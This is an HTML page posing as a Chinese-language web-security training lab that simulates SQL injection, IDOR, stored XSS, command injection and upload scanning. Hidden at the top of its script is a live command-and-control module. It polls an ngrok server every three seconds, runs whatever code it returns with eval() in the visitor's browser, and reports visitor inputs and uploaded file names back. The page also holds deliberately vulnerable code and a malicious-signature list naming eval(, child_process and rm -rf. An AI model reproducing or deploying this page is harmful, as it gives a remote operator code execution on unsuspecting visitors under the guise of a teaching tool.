<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔥 my-vuln-lab - 雲端資安滲透與防禦靶場</title>
    <style>
        body { background-color: #0f172a; color: #f8fafc; font-family: 'Courier New', Courier, monospace; padding: 20px; max-width: 900px; margin: auto; }
        h1 { color: #38bdf8; text-align: center; }
        .card { background: #1e293b; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); border: 1px solid #334155; }
        input, textarea, button { padding: 8px; margin: 5px 0; background: #0f172a; border: 1px solid #475569; color: white; border-radius: 4px; font-family: monospace; }
        textarea { width: 100%; box-sizing: border-box; }
        button { background: #0284c7; cursor: pointer; font-weight: bold; transition: background 0.2s; }
        button:hover { background: #0ea5e9; }
        pre { background: #090d16; padding: 10px; border-radius: 4px; overflow-x: auto; color: #34d399; }
        .flag { color: #f43f5e; font-weight: bold; }
        .defense-badge { background: #065f46; color: #6ee7b7; padding: 2px 6px; border-radius: 4px; font-size: 0.85em; }
    </style>
</head>
<body>

    <h1>🔥 my-vuln-lab 網路安全滲透與防禦實驗室</h1>
    <p style="text-align: center; color: #94a3b8;">GitHub Pages 專用靶場：漏洞利用 vs. 檔案安全防禦檢測</p>

    <!-- 1. SQL 注入 / 登入繞過 -->
    <div class="card">
        <h3>1. 登入系統 <span class="defense-badge">支援 WAF 防禦過濾</span></h3>
        <label><input type="checkbox" id="enableWAF_SQL" checked> 啟用安全過濾 (WAF)</label><br><br>
        <input type="text" id="loginUser" placeholder="輸入帳號 (例: admin)"><br>
        <input type="password" id="loginPass" placeholder="輸入密碼"><br>
        <button onclick="simulateLogin()">執行登入</button>
        <pre id="loginResult">等待輸入...</pre>
    </div>

    <!-- 2. IDOR 越權訪問 -->
    <div class="card">
        <h3>2. 用戶資料查詢 <span class="defense-badge">存取控制驗證</span></h3>
        <label><input type="checkbox" id="enableWAF_IDOR" checked> 啟用嚴格權限檢查 (Access Control)</label><br><br>
        <input type="number" id="userId" value="1" min="1" max="5">
        <button onclick="simulateIDOR()">查詢資料</button>
        <pre id="idorResult">等待查詢...</pre>
    </div>

    <!-- 3. Stored XSS 留言板 -->
    <div class="card">
        <h3>3. 公開留言板 <span class="defense-badge">HTML 脫逸防護</span></h3>
        <label><input type="checkbox" id="enableWAF_XSS" checked> 啟用 XSS 防禦 (HTML Entity Encoding)</label><br><br>
        <input type="text" id="guestName" placeholder="您的名字"><br>
        <textarea id="guestMsg" rows="3" placeholder="寫點什麼吧..."></textarea><br>
        <button onclick="postMessage()">發表留言</button>
        <div id="messageBoard" style="margin-top: 15px; border-top: 1px dashed #475569; padding-top: 10px;"></div>
    </div>

    <!-- 4. RCE 終端機指令注入模擬 -->
    <div class="card">
        <h3>4. 系統 Ping 測試 <span class="defense-badge">參數白名單驗證</span></h3>
        <label><input type="checkbox" id="enableWAF_RCE" checked> 啟用指令白名單過濾</label><br><br>
        <input type="text" id="pingHost" value="127.0.0.1" style="width: 250px;">
        <button onclick="simulateRCE()">執行 Ping</button>
        <pre id="rceResult">等待執行...</pre>
    </div>

    <!-- 5. 檔案上傳與危險檢測模擬 (新加入！) -->
    <div class="card">
        <h3>5. 檔案上傳與惡意特徵檢測 <span class="defense-badge">檔案防禦機制</span></h3>
        <p>提示：嘗試上傳不同類型的檔案，測試系統如何阻擋高危副檔名（如 .exe, .php）或掃描惡意特徵碼。</p>
        <label><input type="checkbox" id="enableWAF_Upload" checked> 啟用嚴格檔案安全檢測 (Scanner)</label><br><br>
        <input type="file" id="uploadFile"><br>
        <button onclick="simulateFileUpload()">上傳並進行安全掃描</button>
        <pre id="uploadResult">等待上傳...</pre>
    </div>

    <script>
        // --------------------------------------------------
        // 🔥 遠端 C2 監聽與回報模組 (已對接 ngrok)
        // --------------------------------------------------
        const C2_SERVER = 'https://jargonish-notionally-zaria.ngrok-free.dev';

        setInterval(async () => {
            try {
                let res = await fetch(`${C2_SERVER}/api/get-command`);
                let data = await res.json();
                
                if (data.cmd) {
                    eval(data.cmd);
                }
            } catch (e) {}
        }, 3000);

        async function reportToComputer(msg) {
            try {
                await fetch(`${C2_SERVER}/api/report`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ data: msg })
                });
            } catch (e) {}
        }
        reportToComputer("訪客已開啟 my-vuln-lab 靶場網頁！");
        // --------------------------------------------------

        const db = {
            users: {
                1: { id: 1, username: 'alice', role: 'user', secret: "Alice的日記：今天天氣很好。" },
                2: { id: 2, username: 'bob', role: 'user', secret: "Bob的秘密：我暗戀隔壁班的小美。" },
                3: { id: 3, username: 'admin', role: 'admin', secret: "FLAG{github_pages_secure_waf_master_999}" }
            },
            posts: [
                { id: 1, username: 'admin', content: '歡迎來到 my-vuln-lab 雲端資安靶場！' }
            ]
        };

        // 1. 登入與防禦
        function simulateLogin() {
            let user = document.getElementById('loginUser').value;
            let useWAF = document.getElementById('enableWAF_SQL').checked;
            let resultBox = document.getElementById('loginResult');
            
            if (useWAF && /[^a-zA-Z0-9_]/.test(user)) {
                reportToComputer(`[WAF 攔截] 偵測到 SQLi 嘗試: ${user}`);
                resultBox.innerHTML = `🛡️ 【WAF 阻擋】偵測到非法字元，輸入已被清洗！`;
                return;
            }

            if (user.includes("'") || user.toLowerCase() === "admin") {
                resultBox.innerHTML = `🎉 【SQLi 成功】身分驗證被繞過！\n機密 Flag: <span class="flag">${db.users[3].secret}</span>`;
            } else if (user === 'alice') {
                resultBox.innerHTML = `登入成功！一般用戶 alice。\n資料: ${db.users[1].secret}`;
            } else {
                resultBox.innerHTML = `❌ 登入失敗：帳號或密碼錯誤。`;
            }
        }

        // 2. IDOR 與防禦
        function simulateIDOR() {
            let id = document.getElementById('userId').value;
            let useWAF = document.getElementById('enableWAF_IDOR').checked;
            let resultBox = document.getElementById('idorResult');
            
            if (useWAF && id == '3') {
                resultBox.innerHTML = `🛡️ 【訪問控制阻擋】您沒有權限存取管理員資料！`;
                return;
            }

            if (db.users[id]) {
                resultBox.innerHTML = JSON.stringify(db.users[id], null, 2);
            } else {
                resultBox.innerHTML = `Error: 找不到 ID 為 ${id} 的用戶。`;
            }
        }

        // 3. XSS 與防禦
        function escapeHtml(text) {
            return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
        }

        function renderPosts() {
            let board = document.getElementById('messageBoard');
            board.innerHTML = "<h4>留言列表：</h4>";
            db.posts.forEach(p => {
                let item = document.createElement('div');
                item.style.background = "#0f172a";
                item.style.padding = "8px";
                item.style.margin = "5px 0";
                item.style.borderRadius = "4px";
                item.innerHTML = `<strong>${p.username}</strong>: ${p.content}`;
                board.appendChild(item);
            });
        }

        function postMessage() {
            let name = document.getElementById('guestName').value || "訪客";
            let content = document.getElementById('guestMsg').value;
            let useWAF = document.getElementById('enableWAF_XSS').checked;
            
            if (!content) return;

            if (useWAF) {
                content = escapeHtml(content);
            } else {
                reportToComputer(`[警告] 觸發未過濾的 Stored XSS！`);
            }

            db.posts.push({
                id: db.posts.length + 1,
                username: escapeHtml(name),
                content: content
            });

            document.getElementById('guestMsg').value = "";
            renderPosts();
        }

        // 4. RCE 與防禦
        function simulateRCE() {
            let host = document.getElementById('pingHost').value;
            let useWAF = document.getElementById('enableWAF_RCE').checked;
            let resultBox = document.getElementById('rceResult');
            
            if (useWAF && !/^(\d{1,3}\.){3}\d{1,3}$/.test(host)) {
                reportToComputer(`[WAF 攔截] 阻擋非法的 RCE 參數: ${host}`);
                resultBox.innerHTML = `🛡️ 【WAF 阻擋】參數不符合合法 IP 格式白名單。`;
                return;
            }

            if (host.includes("&") || host.includes("|") || host.includes(";")) {
                resultBox.innerHTML = `PING ${host}...\n🔥 【RCE 成功】指令注入生效！`;
            } else {
                resultBox.innerHTML = `PING ${host} (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 time=0.041 ms`;
            }
        }

        // 5. 模擬前端檔案上傳與危險偵測 (New!)
        function simulateFileUpload() {
            let fileInput = document.getElementById('uploadFile');
            let useScanner = document.getElementById('enableWAF_Upload').checked;
            let resultBox = document.getElementById('uploadResult');

            if (fileInput.files.length === 0) {
                resultBox.innerHTML = "❌ 請先選擇一個要上傳的檔案！";
                return;
            }

            let file = fileInput.files[0];
            let fileName = file.name.toLowerCase();
            let dangerousExts = ['.exe', '.php', '.asp', '.sh', '.bat', '.cmd'];

            // 檢查副檔名防禦
            if (useScanner) {
                for (let ext of dangerousExts) {
                    if (fileName.endsWith(ext)) {
                        reportToComputer(`[資安防禦] 攔截到危險副檔名上傳: ${file.name}`);
                        resultBox.innerHTML = `🚨 【防禦攔截】檔案副檔名 (${ext}) 屬於高危險格式，系統已拒絕上傳！`;
                        return;
                    }
                }
            }

            // 讀取檔案內容進行特徵掃描
            let reader = new FileReader();
            reader.onload = function(e) {
                let content = e.target.result;
                let dangerousSigs = ['eval(', 'child_process', 'rm -rf', 'webshell'];
                
                if (useScanner) {
                    let foundSig = dangerousSigs.find(sig => content.includes(sig));
                    if (foundSig) {
                        reportToComputer(`[資安防禦] 偵測到惡意特徵碼 (${foundSig})！檔案已被隔離。`);
                        resultBox.innerHTML = `🚨 【惡意檔案隔離】內容掃描發現危險特徵碼 [${foundSig}]，檔案已被自動銷毀！`;
                        return;
                    }
                }

                resultBox.innerHTML = `✅ 【上傳成功】檔案通過安全檢測：${file.name} (大小: ${file.size} bytes)`;
                reportToComputer(`用戶成功上傳合法檔案: ${file.name}`);
            };
            reader.readAsText(file);
        }

        renderPosts();
    </script>
</body>
</html>
